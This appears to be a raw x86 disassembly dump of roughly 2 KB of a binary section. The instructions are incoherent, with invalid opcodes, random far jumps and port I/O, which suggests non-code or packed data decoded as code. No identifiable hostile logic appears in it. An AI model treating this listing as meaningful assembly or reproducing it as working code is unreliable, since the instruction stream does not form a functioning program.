  412e40:	adc    al,0x9c
  412e42:	std    
  412e43:	cmp    DWORD PTR [esi+0x537277fc],ecx
  412e49:	mov    ah,0x51
  412e4b:	sahf   
  412e4c:	pop    esp
  412e4d:	fimul  DWORD PTR [edx-0x30]
  412e50:	pop    es
  412e51:	jmp    0x749d:0x25e81441
  412e58:	daa    
  412e59:	sbb    DWORD PTR ds:0xebd9508c,edx
  412e5f:	sbb    esi,edx
  412e61:	mov    bh,0x38
  412e63:	mov    bl,0x7f
  412e65:	mul    DWORD PTR [eax+0x3e91b0cb]
  412e6b:	sbb    bl,BYTE PTR [edx-0x51]
  412e6e:	adc    DWORD PTR [edx],esp
  412e70:	mov    ch,0xf1
  412e72:	fild   QWORD PTR [edx+0x7845a1b3]
  412e78:	pop    eax
  412e79:	mov    dh,0x50
  412e7b:	push   ds
  412e7c:	into   
  412e7d:	push   esp
  412e7e:	mov    al,0xec
  412e80:	mov    ah,0xee
  412e82:	pop    edx
  412e83:	jns    0x412e1f
  412e85:	(bad)  
  412e86:	dec    BYTE PTR [esi-0x43efb0d4]
  412e8c:	dec    esp
  412e8d:	scas   al,BYTE PTR es:[edi]
  412e8e:	ret    0xf55f
  412e91:	sbb    DWORD PTR [ebx+0x6f39f58c],0xf
  412e98:	push   esp
  412e99:	jmp    0x9e50733b
  412e9e:	fs dec ebp
  412ea0:	pop    ebx
  412ea1:	add    eax,0x711f81f8
  412ea6:	scas   eax,DWORD PTR es:[edi]
  412ea7:	sub    BYTE PTR [edi+0x34],ah
  412eaa:	mov    cl,0xfc
  412eac:	inc    edi
  412ead:	cmp    esi,DWORD PTR ds:0xac2068ca
  412eb3:	sbb    al,0x57
  412eb5:	js     0x412f18
  412eb7:	add    ch,BYTE PTR [esi-0x65]
  412eba:	inc    ebx
  412ebb:	mov    BYTE PTR [ecx+0x2927b29],dh
  412ec1:	dec    edx
  412ec2:	sahf   
  412ec3:	xor    cl,BYTE PTR [edi+0x6332198e]
  412ec9:	cmp    dl,cl
  412ecb:	lods   al,BYTE PTR ds:[esi]
  412ecc:	and    eax,edx
  412ece:	and    DWORD PTR [ecx+0x3bdb6279],ebp
  412ed4:	jecxz  0x412ec0
  412ed6:	push   ds
  412ed7:	jmp    0xc801b34c
  412edc:	js     0x412f03
  412ede:	and    al,0xb8
  412ee0:	scas   eax,DWORD PTR es:[edi]
  412ee1:	scas   al,BYTE PTR es:[edi]
  412ee2:	in     al,0x97
  412ee4:	test   eax,0x770189dc
  412ee9:	mov    al,ds:0x28121b5b
  412eee:	sub    BYTE PTR cs:[edx-0x33dfcb52],0xa4
  412ef6:	push   esi
  412ef7:	xor    BYTE PTR [edi-0x5fa249ec],ah
  412efd:	ja     0x412edc
  412eff:	mov    bl,0xb0
  412f01:	js     0x412f51
  412f03:	xchg   edi,eax
  412f04:	mov    al,0xdf
  412f06:	and    eax,0x37
  412f09:	mov    gs,WORD PTR [edi+0x4]
  412f0c:	int    0x49
  412f0e:	cwde   
  412f0f:	adc    eax,0x3d14bab1
  412f14:	retf   
  412f15:	sub    DWORD PTR [ebx-0x26d5c3d4],ebp
  412f1b:	aam    0x50
  412f1d:	ds inc eax
  412f1f:	push   ecx
  412f20:	cmc    
  412f21:	fmulp  st(3),st
  412f23:	and    esi,eax
  412f25:	cwde   
  412f26:	push   edx
  412f27:	adc    eax,0x3a710728
  412f2c:	cmp    ebx,DWORD PTR [ebx+0x1746d58e]
  412f32:	jno    0x412ebf
  412f34:	pop    esp
  412f35:	arpl   WORD PTR [eax],di
  412f37:	stc    
  412f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f39:	ror    BYTE PTR [edx-0x2c],0x7b
  412f3d:	sub    dl,BYTE PTR [edx+eiz*8-0x24]
  412f41:	test   al,0x71
  412f43:	enter  0x2507,0xdb
  412f47:	jns    0x412edf
  412f49:	jle    0x412f35
  412f4b:	pop    ebx
  412f4c:	add    eax,0xfce12452
  412f51:	adc    ebp,edi
  412f53:	out    dx,eax
  412f54:	popa   
  412f55:	enter  0x8c96,0xd1
  412f59:	jbe    0x412f4b
  412f5b:	dec    ebx
  412f5c:	je     0x412f32
  412f5e:	clc    
  412f5f:	jns    0x412f9a
  412f61:	not    BYTE PTR [eax-0x773077d5]
  412f67:	cli    
  412f68:	jns    0x412fe0
  412f6a:	sbb    al,0x10
  412f6c:	cmp    bh,BYTE PTR [esp+eiz*2-0x352fcf3c]
  412f73:	jbe    0x412f36
  412f75:	jo     0x412fef
  412f77:	out    dx,eax
  412f78:	push   edx
  412f79:	aad    0xd4
  412f7b:	cmp    DWORD PTR [eax+edx*4+0xe],0x1b
  412f80:	jp     0x412fc8
  412f82:	das    
  412f83:	mov    ds:0x633c61ab,eax
  412f88:	add    al,0x69
  412f8a:	fld    DWORD PTR [esi]
  412f8c:	sbb    bh,dl
  412f8e:	sbb    BYTE PTR [esi+0x64b72ea],ah
  412f94:	sti    
  412f95:	cld    
  412f96:	xor    BYTE PTR ds:0x19f8448b,ah
  412f9c:	lds    esp,FWORD PTR cs:[ebx-0x71a85e09]
  412fa3:	inc    ebp
  412fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fa5:	sub    DWORD PTR [edx+0x1b],edi
  412fa8:	mov    BYTE PTR [eax+0x7f146530],dl
  412fae:	and    edx,edx
  412fb0:	call   0xebf3:0xf1e1cd92
  412fb7:	std    
  412fb8:	popa   
  412fb9:	out    dx,al
  412fba:	jmp    0xceb69f4f
  412fbf:	push   cs
  412fc0:	ins    BYTE PTR es:[edi],dx
  412fc1:	xor    al,0xbd
  412fc3:	mov    al,0x8
  412fc5:	(bad)  
  412fc6:	(bad)  
  412fc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fc9:	retf   
  412fca:	sbb    eax,0x7ceaf9ea
  412fcf:	xor    bl,ah
  412fd1:	outs   dx,DWORD PTR ds:[esi]
  412fd2:	and    DWORD PTR [edi+0x6a33e91a],edx
  412fd8:	scas   al,BYTE PTR es:[edi]
  412fd9:	xchg   ebp,eax
  412fda:	xor    al,0x20
  412fdc:	jge    0x412ff1
  412fde:	bswap  edi
  412fe0:	iret   
  412fe1:	mov    dl,0x55
  412fe3:	fcom   QWORD PTR [edi-0x15]
  412fe6:	mov    DWORD PTR [esi-0x71],ecx
  412fe9:	test   BYTE PTR [edi+0x234f990],bh
  412fef:	call   0x74222413
  412ff4:	jo     0x412fe5
  412ff6:	inc    ebx
  412ff7:	xchg   dx,ax
  412ff9:	jl     0x412fe1
  412ffb:	adc    DWORD PTR [esi+0x58ff2144],esp
  413001:	pop    ecx
  413002:	scas   eax,DWORD PTR es:[edi]
  413003:	jnp    0x412fcd
  413005:	xor    eax,0x670d0c35
  41300a:	frstor [esi+0x7d739f45]
  413010:	dec    edx
  413011:	js     0x413027
  413013:	mov    esi,0xb5a8ed0d
  413018:	cmp    edi,DWORD PTR [edi+0x501952ce]
  41301e:	mov    al,ds:0x20885b8c
  413023:	push   edi
  413024:	(bad)  [ebp-0x20b07896]
  41302a:	jecxz  0x412fd8
  41302c:	jb     0x4130a2
  41302e:	pop    eax
  41302f:	lds    edx,FWORD PTR ds:0xc9f339a9
  413035:	jmp    0xcf52:0x6b88723d
  41303c:	xor    esi,DWORD PTR [edi]
  41303e:	arpl   WORD PTR [ebx-0x3ecbde29],bx
  413044:	jle    0x4130bd
  413046:	jno    0x413070
  413048:	cmp    al,0xaf
  41304a:	adc    eax,0x55532b99
  41304f:	jae    0x41302e
  413051:	into   
  413052:	inc    esp
  413053:	les    ecx,FWORD PTR [esi+0x6]
  413056:	xchg   edi,eax
  413057:	jne    0x412fe0
  413059:	cmp    BYTE PTR [esi+0x73738fc2],ch
  41305f:	mov    esp,esi
  413061:	pop    ebx
  413062:	cmp    cl,dh
  413064:	ja     0x413043
  413066:	imul   ecx,DWORD PTR [edi+esi*4+0x1],0xe
  41306b:	fisubr WORD PTR [edi-0x34]
  41306e:	(bad)  
  41306f:	shl    ah,cl
  413071:	aam    0xf5
  413073:	pop    ebp
  413074:	jbe    0x413049
  413076:	repnz out 0x97,al
  413079:	or     al,0x54
  41307b:	xlat   BYTE PTR ds:[ebx]
  41307c:	mov    bh,BYTE PTR [ebx-0x25]
  41307f:	std    
  413080:	sub    ecx,esi
  413082:	add    DWORD PTR [edi-0x4c],eax
  413085:	sahf   
  413086:	call   0xc26fbf97
  41308b:	neg    DWORD PTR [eax+0x23]
  41308e:	outs   dx,DWORD PTR ds:[esi]
  41308f:	test   eax,0xa1db5de2
  413094:	pop    ecx
  413095:	add    esp,DWORD PTR [ecx]
  413097:	push   cs
  413098:	into   
  413099:	pop    ds
  41309a:	ret    
  41309b:	test   BYTE PTR [edi-0x58],0xf4
  41309f:	cmp    DWORD PTR [esi-0x30],ecx
  4130a2:	xchg   esi,eax
  4130a3:	ins    DWORD PTR es:[edi],dx
  4130a4:	or     eax,0xd674e425
  4130a9:	dec    edx
  4130aa:	arpl   WORD PTR [ebx-0x16],bp
  4130ad:	jb     0x413049
  4130af:	push   0xffffffc7
  4130b1:	sbb    eax,0x780abc90
  4130b6:	popf   
  4130b7:	pop    edi
  4130b8:	fst    QWORD PTR [ecx-0x17411e5e]
  4130be:	push   ebx
  4130bf:	lods   eax,DWORD PTR ds:[esi]
  4130c0:	std    
  4130c1:	jmp    0x604ce02c
  4130c6:	xchg   ecx,eax
  4130c7:	add    ch,BYTE PTR [eax+0x61]
  4130ca:	mov    cl,0x3e
  4130cc:	scas   eax,DWORD PTR es:[edi]
  4130cd:	push   esp
  4130ce:	mov    WORD PTR [ebx],?
  4130d0:	out    0xbe,al
  4130d2:	nop
  4130d3:	push   0xffffffbc
  4130d5:	lock mov ebx,0x42a478b0
  4130db:	std    
  4130dc:	jge    0x4130a3
  4130de:	push   esp
  4130df:	clc    
  4130e0:	push   0x39
  4130e2:	push   ebp
  4130e3:	fist   WORD PTR [edi+0x6cc9f36e]
  4130e9:	sbb    ecx,edx
  4130eb:	hlt    
  4130ec:	mov    bh,0x2c
  4130ee:	dec    ebp
  4130ef:	cwde   
  4130f0:	jle    0x41310e
  4130f2:	mov    edi,0xfbb58f2b
  4130f7:	pop    ebx
  4130f8:	jg     0x413139
  4130fa:	xchg   esi,eax
  4130fb:	mov    ch,0x61
  4130fd:	loope  0x4130c5
  4130ff:	xor    ebx,DWORD PTR ds:0x480b1fdb
  413105:	aas    
  413106:	sub    al,0x8
  413108:	outs   dx,BYTE PTR ds:[esi]
  413109:	neg    ebx
  41310b:	mov    DWORD PTR [edx+0x418dd4ab],ebx
  413111:	outs   dx,DWORD PTR ds:[esi]
  413112:	pop    ss
  413113:	adc    edi,DWORD PTR [ecx+0x23]
  413116:	push   esi
  413117:	mov    ah,0xa5
  413119:	retf   0x75a1
  41311c:	(bad)  
  41311d:	xor    BYTE PTR [eax-0x75],dh
  413120:	sbb    DWORD PTR [edx-0x2f],eax
  413123:	jae    0x41318e
  413125:	imul   ebx,DWORD PTR ds:0xa0109cc4,0xc2de535c
  41312f:	mov    bh,bh
  413131:	cmp    BYTE PTR [edi+0x64],bl
  413134:	cmp    bh,BYTE PTR [eax]
  413136:	jne    0x413167
  413138:	sbb    DWORD PTR [ebx+0x24f7966e],eax
  41313e:	push   eax
  41313f:	icebp  
  413140:	cmp    cl,dh
  413142:	je     0x41318a
  413144:	xchg   esi,eax
  413145:	ss sbb BYTE PTR ss:[edx+0x282c81c6],0xbc
  41314e:	jmp    0x41310d
  413150:	into   
  413151:	mov    ds:0xe2ca38e0,al
  413156:	aaa    
  413157:	push   edi
  413158:	push   cs
  413159:	(bad)  
  41315a:	sbb    edx,DWORD PTR [edx+0x63]
  41315d:	repnz mov es,edi
  413160:	jecxz  0x4130f5
  413162:	imul   edx,DWORD PTR [eax],0x3d8cd89b
  413168:	frstor [edi]
  41316a:	lods   al,BYTE PTR ds:[esi]
  41316b:	loope  0x41317c
  41316d:	test   esp,ecx
  41316f:	or     eax,0x1a04df6d
  413174:	popf   
  413175:	and    dl,BYTE PTR [esp+ecx*4]
  413178:	leave  
  413179:	mov    cl,0x92
  41317b:	pop    edi
  41317c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41317d:	mov    ds,edi
  41317f:	out    dx,al
  413180:	and    eax,0x905c691e
  413185:	xchg   esp,eax
  413186:	cmp    BYTE PTR [edx],bl
  413188:	adc    ecx,DWORD PTR [ebx+0x76]
  41318b:	outs   dx,DWORD PTR ds:[esi]
  41318c:	ds pop ebx
  41318e:	mov    dh,0xda
  413190:	mov    esp,0xe91d102b
  413195:	push   cs
  413196:	pop    esp
  413197:	inc    eax
  413198:	sub    BYTE PTR ds:0xaac4d6c7,ch
  41319e:	lods   al,BYTE PTR ds:[esi]
  41319f:	add    esp,esi
  4131a1:	hlt    
  4131a2:	stc    
  4131a3:	cs and eax,DWORD PTR gs:[eax-0x63fd658b]
  4131ab:	mov    ecx,0x4a939054
  4131b0:	jecxz  0x41322a
  4131b2:	arpl   WORD PTR [ebp-0x37],si
  4131b5:	xchg   ecx,eax
  4131b6:	add    BYTE PTR [edi],dl
  4131b8:	mov    dh,0x4b
  4131ba:	enter  0x9888,0x99
  4131be:	and    BYTE PTR [edi+ecx*1+0x67fa6cb8],0x5
  4131c6:	outs   dx,BYTE PTR ds:[esi]
  4131c7:	mov    ebx,0xeda9f101
  4131cc:	mov    bl,0xdb
  4131ce:	jl     0x41322d
  4131d0:	add    esi,ebp
  4131d2:	in     al,0x4a
  4131d4:	push   ss
  4131d5:	mov    ecx,0xcc18b8db
  4131da:	fsub   QWORD PTR [esi+0x6055439d]
  4131e0:	sbb    eax,0x90fe35df
  4131e5:	mov    ebp,0x6227ee05
  4131ea:	or     eax,0x9451b75f
  4131ef:	(bad)  
  4131f0:	push   edx
  4131f1:	fst    DWORD PTR [eax-0x48]
  4131f4:	cli    
  4131f5:	pop    ebx
  4131f6:	sub    dl,cl
  4131f8:	or     DWORD PTR [eax+0x6777552],eax
  4131fe:	pop    es
  4131ff:	enter  0xd950,0x1f
  413203:	mov    edi,0x1f11868d
  413208:	mul    dl
  41320a:	adc    BYTE PTR [eax],0x47
  41320d:	push   edi
  41320e:	xchg   esi,ebp
  413210:	nop
  413211:	in     eax,0x90
  413213:	fdiv   DWORD PTR [esi+esi*8-0x2996e145]
  41321a:	test   BYTE PTR [ecx+ecx*8+0x8],cl
  41321e:	test   eax,0xe1561ad3
  413223:	mov    edx,0xdecc2fa1
  413228:	pop    eax
  413229:	pop    edi
  41322a:	lds    esp,FWORD PTR [ebp+0x952a873]
  413230:	les    ebp,FWORD PTR [eax-0x5a420f49]
  413236:	push   ebp
  413237:	fcomp  QWORD PTR gs:[ebx]
  41323a:	jae    0x413219
  41323c:	cmp    DWORD PTR ds:0xa8e724c8,0xffffffe5
  413243:	mov    ebp,0x970f6556
  413248:	aam    0xfd
  41324a:	mov    edi,DWORD PTR [esi+0x23]
  41324d:	pop    ecx
  41324e:	out    dx,eax
  41324f:	jl     0x41320d
  413251:	gs (bad) 
  413253:	mov    edx,0x96a26554
  413258:	cmp    al,0xda
  41325a:	add    DWORD PTR [ebx],ebx
  41325c:	or     al,0x77
  41325e:	push   0x1ba532f9
  413263:	idiv   DWORD PTR [edx-0x3a]
  413266:	mov    ebx,0x7d7e1ad2
  41326b:	call   0x582a2c11
  413270:	mov    ah,0x5b
  413272:	addr16 out dx,al
  413274:	ficom  DWORD PTR [eax]
  413276:	mov    ebp,0x3219295a
  41327b:	and    ch,BYTE PTR [ecx+edx*2]
  41327e:	loop   0x4132c2
  413280:	fstp   QWORD PTR [edx]
  413282:	inc    esp
  413283:	add    dl,BYTE PTR [edx]
  413285:	call   0xddbc:0xee4a4131
  41328c:	(bad)  
  41328d:	mov    bh,0x88
  41328f:	mov    bh,0x72
  413291:	(bad)  
  413292:	sub    al,0x38
  413294:	clc    
  413295:	pop    edx
  413296:	arpl   WORD PTR [esi+edx*4+0x68],si
  41329a:	xchg   esp,eax
  41329b:	fdivp  st(7),st
  41329d:	pushf  
  41329e:	fsubp  st(7),st
  4132a0:	push   esi
  4132a1:	icebp  
  4132a2:	or     esi,DWORD PTR [ebp+0x6aca74de]
  4132a8:	inc    edx
  4132a9:	adc    eax,0x9aa592d7
  4132ae:	push   esp
  4132af:	mov    edi,0xd6ccf6f
  4132b4:	mov    al,ds:0x2bafda97
  4132ba:	pushf  
  4132bb:	or     eax,0x6aee096f
  4132c0:	cmp    edx,DWORD PTR [ecx]
  4132c2:	mov    bh,0x7
  4132c4:	sbb    ch,bl
  4132c6:	mov    cl,0xee
  4132c8:	and    al,BYTE PTR [ebx+0x76]
  4132cb:	pop    edx
  4132cc:	xchg   BYTE PTR [ebx-0x1e75f68c],cl
  4132d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132d3:	(bad)
  4132d7:	pop    ebx
  4132d8:	sub    bh,ch
  4132da:	out    0x8d,al
  4132dc:	dec    eax
  4132dd:	pop    es
  4132de:	es addr16 dec edx
  4132e1:	mov    bl,0x8d
  4132e3:	lods   eax,DWORD PTR cs:[esi]
  4132e5:	xchg   esp,eax
  4132e6:	mov    edx,0xb5193db3
  4132eb:	imul   ebp,DWORD PTR [eax],0xffffff91
  4132ee:	std    
  4132ef:	aam    0x98
  4132f1:	lahf   
  4132f2:	and    eax,0x45cf537c
  4132f7:	gs push cs
  4132f9:	inc    ebx
  4132fa:	jg     0x413283
  4132fc:	cmc    
  4132fd:	push   0xfffffff2
  4132ff:	gs pop edx
  413301:	sbb    ebx,DWORD PTR [ebx+0x2093391d]
  413307:	in     al,0xb4
  413309:	add    BYTE PTR [ebx+0x440ac9a0],ch
  41330f:	xchg   edx,eax
  413310:	stos   DWORD PTR es:[edi],eax
  413311:	cvttps2pi mm7,QWORD PTR [edx+edx*4+0x7ae0ccaf]
  413319:	aad    0x53
  41331b:	jmp    0x775f41d6
  413320:	add    bh,0x2f
  413323:	add    DWORD PTR [esi],eax
  413325:	test   al,0xe2
  413327:	pop    edi
  413328:	sub    al,0x7b
  41332a:	sbb    al,0xb3
  41332c:	or     ah,al
  41332e:	inc    esp
  41332f:	dec    ebp
  413330:	cmp    ch,al
  413332:	or     esp,esp
  413334:	fbstp  TBYTE PTR gs:0xe7a32bc6
  41333b:	mov    edx,ebp
  41333d:	je     0x41336a
  41333f:	or     al,0x11
  413341:	jl     0x413319
  413343:	cmp    BYTE PTR [esi-0x76],cl
  413346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413347:	aad    0x9c
  413349:	mov    ah,0x79
  41334b:	jnp    0x413347
  41334d:	dec    ebx
  41334e:	mov    cl,0x1a
  413350:	mov    edx,0x4c5b7668
  413355:	cmp    eax,0xe4372ae6
  41335a:	lods   al,BYTE PTR ds:[esi]
  41335b:	sub    al,0x6e
  41335d:	mov    ebx,0x7bc6ce29
  413362:	and    BYTE PTR [edx-0x2],0x8a
  413366:	div    esi
  413368:	inc    esi
  413369:	add    eax,0x500c58e6
  41336e:	ins    BYTE PTR es:[edi],dx
  41336f:	jbe    0x4133ca
  413371:	test   al,0x92
  413373:	add    BYTE PTR [edi-0x3e],dl
  413376:	loop   0x41335a
  413378:	and    eax,0x8d2a9647
  41337d:	nop
  41337e:	xchg   BYTE PTR [esp+edx*4],ch
  413381:	scas   eax,DWORD PTR es:[edi]
  413382:	aad    0x35
  413384:	lods   al,BYTE PTR ds:[esi]
  413385:	ret    0xb722
  413388:	push   edi
  413389:	dec    esi
  41338a:	fisubr DWORD PTR [esi-0x43]
  41338d:	das    
  41338e:	mov    ebx,0xac6845cf
  413393:	outs   dx,BYTE PTR ds:[esi]
  413394:	pop    ds
  413395:	aaa    
  413396:	mov    ebp,0x5eb2b89d
  41339b:	pop    edx
  41339c:	push   ss
  41339d:	xchg   BYTE PTR ss:[esi],ah
  4133a0:	shl    BYTE PTR [edx],1
  4133a2:	push   esi
  4133a3:	push   esi
  4133a4:	xchg   BYTE PTR [ebx],cl
  4133a6:	sub    ebp,DWORD PTR [eax]
  4133a8:	add    al,0xbd
  4133aa:	mov    esi,0xeac22e65
  4133af:	dec    esi
  4133b0:	jle    0x4133be
  4133b2:	pop    es
  4133b3:	add    eax,0x9df9c3ac
  4133b8:	pop    ebp
  4133b9:	mov    ebx,0xbc6d9682
  4133be:	in     al,0xbd
  4133c0:	fdiv   st,st(0)
  4133c2:	fs push esi
  4133c4:	mov    dl,0x17
  4133c6:	or     al,0xc5
  4133c8:	repz retf 
  4133ca:	nop
  4133cb:	call   DWORD PTR [edi+0x7c]
  4133ce:	aad    0xc
  4133d0:	sub    eax,0x88f97365
  4133d5:	in     eax,0x5a
  4133d7:	lock test BYTE PTR [eax+eiz*1-0x66cf6d9e],bl
  4133df:	lock test al,0x6a
  4133e2:	xchg   esp,eax
  4133e3:	dec    edx
  4133e4:	aas    
  4133e5:	je     0x41340d
  4133e7:	inc    ecx
  4133e8:	jno    0x413439
  4133ea:	(bad)  
  4133eb:	cwde   
  4133ec:	int    0x72
  4133ee:	adc    al,0x64
  4133f0:	hlt    
  4133f1:	mov    ch,0x1b
  4133f3:	not    DWORD PTR [eax+0x5476af1b]
  4133f9:	adc    BYTE PTR [ebp+0x42261c2d],bh
  4133ff:	outs   dx,DWORD PTR ds:[esi]
  413400:	and    DWORD PTR [edx+0x120c2ae2],0x3cd6bebf
  41340a:	push   esp
  41340b:	mov    DWORD PTR [eax+0x3e48d7eb],0x8bf7b1b
  413415:	mov    al,0x8b
  413417:	retf   0x670d
  41341a:	jbe    0x413425
  41341c:	outs   dx,BYTE PTR ds:[esi]
  41341d:	jns    0x4133f9
  41341f:	mov    ebx,eax
  413421:	stos   DWORD PTR es:[edi],eax
  413422:	mov    ebx,0xf6274589
  413427:	dec    eax
  413428:	and    bl,BYTE PTR ds:0x5dc21113
  41342e:	jmp    0xdbc8:0xadfd5907
  413435:	jbe    0x413427
  413437:	repz adc eax,DWORD PTR [esi-0x17e54b15]
  41343e:	adc    DWORD PTR [edi],eax
  413440:	xchg   edi,eax
  413441:	rcl    DWORD PTR [ebx],0xc8
  413444:	sub    BYTE PTR [edi-0x7b],dh
  413447:	push   ds
  413448:	cmc    
  413449:	dec    ebp
  41344a:	and    al,0xc2
  41344c:	and    eax,0x1a483f01
  413451:	cld    
  413452:	push   ds
  413453:	aas    
  413454:	xchg   esp,eax
  413455:	xor    BYTE PTR [eax],cl
  413457:	dec    esi
  413458:	cmp    al,0xe2
  41345a:	enter  0x84a0,0x9a
  41345e:	int    0xc0
  413460:	outs   dx,BYTE PTR ds:[esi]
  413461:	mov    cl,0x66
  413463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413464:	add    BYTE PTR [ebx+0x4c],dl
  413467:	dec    ebx
  413468:	stos   BYTE PTR es:[edi],al
  413469:	push   ecx
  41346a:	adc    BYTE PTR [eax+0x7f17eaf3],al
  413470:	sar    DWORD PTR [esp+edi*1],1
  413473:	push   ebx
  413474:	ret    
  413475:	pop    esi
  413476:	mov    esp,0xfefa3b33
  41347b:	(bad)  
  41347c:	mov    eax,0x6f719f1f
  413481:	ins    BYTE PTR es:[edi],dx
  413482:	or     BYTE PTR [ecx-0x80],0xcd
  413486:	mov    al,0x61
  413488:	push   ebp
  413489:	inc    esp
  41348a:	imul   eax,DWORD PTR [edx],0x7d69bbd3
  413490:	out    0xcc,al
  413492:	das    
  413493:	addr16 dec ecx
  413495:	fsubr  QWORD PTR [eax+0x714b939b]
  41349b:	out    dx,eax
  41349c:	sub    eax,0x87e6da45
  4134a1:	jb     0x413453
  4134a3:	dec    esp
  4134a4:	push   esp
  4134a5:	add    DWORD PTR [edx-0x76],edi
  4134a8:	xor    BYTE PTR [eax-0x35],dl
  4134ab:	or     eax,ebp
  4134ad:	inc    edx
  4134ae:	add    ebp,DWORD PTR [esi]
  4134b0:	arpl   WORD PTR [esi],cx
  4134b2:	mov    eax,ds:0x74e5b1ea
  4134b7:	xor    al,bh
  4134b9:	inc    edx
  4134ba:	pop    esi
  4134bb:	mov    ebx,0x8143d1dc
  4134c0:	test   eax,0xd16505e5
  4134c5:	jp     0x413461
  4134c7:	leave  
  4134c8:	jae    0x413522
  4134ca:	adc    ebp,edx
  4134cc:	cwde   
  4134cd:	or     BYTE PTR [edx+0x39e462db],0x7b
  4134d4:	call   0x7db8:0x6ae9f796
  4134db:	add    BYTE PTR [edx-0x10ff5980],al
  4134e1:	or     eax,0xb0db2f5c
  4134e6:	enter  0xf86d,0x9c
  4134ea:	imul   eax,DWORD PTR [esi],0x52
  4134ed:	ja     0x413512
  4134ef:	push   ss
  4134f0:	add    eax,0xe57cb2f6
  4134f5:	or     BYTE PTR ds:0x733546a9,bl
  4134fb:	scas   eax,DWORD PTR es:[edi]
  4134fc:	daa    
  4134fd:	cmp    cl,ch
  4134ff:	ror    DWORD PTR [esi+edx*8+0x74],0x46
  413504:	pop    ss
  413505:	jae    0x4134af
  413507:	xor    al,BYTE PTR [ebp+0x337413f5]
  41350d:	ficom  WORD PTR [esi]
  41350f:	test   DWORD PTR [ebp+ebp*4+0x74d5cec7],0x121a83ad
  41351a:	and    eax,DWORD PTR [esi+0xbfb9260]
  413520:	mov    edx,0xe159da3
  413525:	push   ecx
  413526:	dec    ecx
  413527:	adc    esi,DWORD PTR [esi+ebp*1]
  41352a:	sub    ecx,DWORD PTR [eax-0x66]
  41352d:	add    dl,0x1d
  413530:	loopne 0x41358f
  413532:	jne    0x413578
  413534:	ins    DWORD PTR es:[edi],dx
  413535:	sbb    al,0x13
  413537:	push   edi
  413538:	int3   
  413539:	imul   esi,DWORD PTR [edx+0x19],0xffffff97
  41353d:	xchg   edx,eax
  41353e:	adc    ch,bl
  413540:	nop
  413541:	adc    ch,BYTE PTR [esi+0x582c6200]
  413547:	or     eax,DWORD PTR [edx+0x58032ba5]
  41354d:	pop    ecx
  41354e:	mov    dh,0x74
  413550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413551:	dec    ebx
  413552:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413553:	fwait
  413554:	mov    edi,0xe75e9255
  413559:	jnp    0x4135d1
  41355b:	icebp  
  41355c:	adc    eax,0xda4b4b6
  413561:	enter  0xdc5,0x22
  413565:	adc    DWORD PTR [edi+0x66fb468d],0x1971f5f8
  41356f:	in     eax,0xb
  413571:	rcr    BYTE PTR [esi-0x148e91eb],0x7
  413578:	ret    0x7fef
  41357b:	jmp    0xe7d58105
  413580:	push   edx
  413581:	ja     0x413596
  413583:	dec    edx
  413584:	lahf   
  413585:	mov    ecx,0x5a0a42b
  41358a:	mov    ecx,0xf15fe543
  41358f:	cld    
  413590:	or     DWORD PTR [esi],esi
  413592:	aam    0x5f
  413594:	or     eax,0x79f1b5d4
  413599:	sbb    al,0xfc
  41359b:	stos   DWORD PTR es:[edi],eax
  41359c:	repz mov eax,ds:0x3fa20763
  4135a2:	(bad)  
  4135a3:	imul   ecx,DWORD PTR [edi+edi*1],0x2a
  4135a7:	dec    ecx
  4135a8:	mov    esp,0xeb4ff0ad
  4135ad:	push   esi
  4135ae:	and    eax,DWORD PTR [edi+ebp*4]
  4135b1:	loopne 0x4135f5
  4135b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135b4:	les    edi,FWORD PTR [ebp+0x72ba9524]
  4135ba:	fbld   TBYTE PTR [eax+0x67f5c987]
  4135c0:	das    
  4135c1:	leave  
  4135c2:	mov    ecx,0x2a641ff0
  4135c7:	hlt    
  4135c8:	stc    
  4135c9:	int3   
  4135ca:	and    esp,ebx
  4135cc:	push   0xad89c728
  4135d1:	out    0xb8,eax
  4135d3:	cs jmp 0xa7796f
  4135d9:	lods   ax,WORD PTR ds:[esi]
  4135db:	cmp    eax,0xe3c2c0cb
  4135e0:	cmp    esp,DWORD PTR [ebx-0x5b7a3edb]
  4135e6:	inc    esp
  4135e7:	neg    DWORD PTR [ecx]
  4135e9:	std    
  4135ea:	or     DWORD PTR [eax+0x12],edi
  4135ed:	aaa    
  4135ee:	and    eax,0xc83417d2
  4135f3:	sub    DWORD PTR [edx],ebp
  4135f5:	into   
  4135f6:	jmp    0x9e5687fd
  4135fb:	test   DWORD PTR [ecx-0x1d641ac2],0x745eb0df
  413605:	cmp    al,0x27
  413607:	out    0x35,eax
  413609:	aad    0xa3
  41360b:	xchg   DWORD PTR [edx+0x5c],eax
  41360e:	jae    0x41359d
  413610:	dec    ebp
  413611:	scas   eax,DWORD PTR es:[edi]
  413612:	sub    al,0xab
  413614:	sahf   
  413615:	loop   0x413643
  413617:	pusha  
  413618:	cmp    eax,0x1feab08e
  41361d:	inc    ecx
  41361e:	fs mov ah,0x1d
  413621:	push   cs
  413622:	out    0x66,al
  413624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413625:	test   DWORD PTR [edx],0xba91cd1e
  41362b:	aam    0xfd
  41362d:	pop    ebx
  41362e:	sub    eax,0x72eb4bb
  413633:	sub    edi,DWORD PTR [eax-0x65]
  413636:	cdq    
  413637:	les    esp,FWORD PTR [eax-0xce522e2]
  41363d:	jl     0x4136a3
  41363f:	retf   
  413640:	sbb    al,0x1f
  413642:	mov    WORD PTR [ebp+0x4c],?
  413645:	xchg   esp,eax
  413646:	pop    ebp
  413647:	outs   dx,BYTE PTR ds:[esi]
  413648:	pushf  
  413649:	push   ss
  41364a:	out    0xb,al
  41364c:	in     eax,0x1a
  41364e:	data16 ds fwait
  413651:	das    
  413652:	mov    BYTE PTR [edx-0x4b57831a],dh
  413658:	sahf   
  413659:	adc    cl,dl
  41365b:	fst    QWORD PTR [ecx]
  41365d:	in     al,0x63
  41365f:	mov    ah,0xc5
  413661:	scas   eax,DWORD PTR es:[edi]
